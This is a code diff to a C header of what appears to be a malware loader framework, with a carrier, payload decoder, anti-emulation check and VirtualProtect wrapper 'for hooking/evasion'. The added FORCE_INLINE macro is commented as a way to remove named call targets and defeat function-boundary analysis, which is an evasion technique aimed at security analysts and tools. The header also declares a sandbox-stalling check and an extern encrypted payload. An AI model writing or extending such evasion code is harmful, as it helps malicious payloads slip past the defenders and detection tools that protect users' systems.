@@ -8,6 +8,16 @@
 #define p_RX  0x20
 #define p_RWX 0x40
 
+// Force-inline: eliminates named call targets in the binary.
+// Applied to decode_payload and MyVirtualProtect so their code merges
+// into the carrier, defeating function-boundary analysis.
+// New module variants: match FORCE_INLINE on the definition to match this declaration.
+#if defined(__clang__) || defined(__GNUC__)
+#define FORCE_INLINE __attribute__((always_inline)) static inline
+#else
+#define FORCE_INLINE static inline
+#endif
+
 // Wrapper for VirtualProtect to allow hooking/instrumentation
 // implementations can redefine this
 typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
@@ -22,7 +32,7 @@ typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
 int carrier(void);
 
 // Decoder: Decrypts 'len' bytes at 'dest'.
-void decode_payload(char *dest, int len);
+FORCE_INLINE void decode_payload(char *dest, int len);
 
 // AntiEmulation: Burns resources or checks environment. 
 // Should return quickly if real, stall/crash if fake.
@@ -40,7 +50,7 @@ void deconditioner(void);
 int guardrail(void);
 
 // VirtualProtect Module: Wraps the API for hooking/evasion
-BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+FORCE_INLINE BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 
 // Global Payload Access (Provided by payload.h)
 extern unsigned char supermega_payload[];
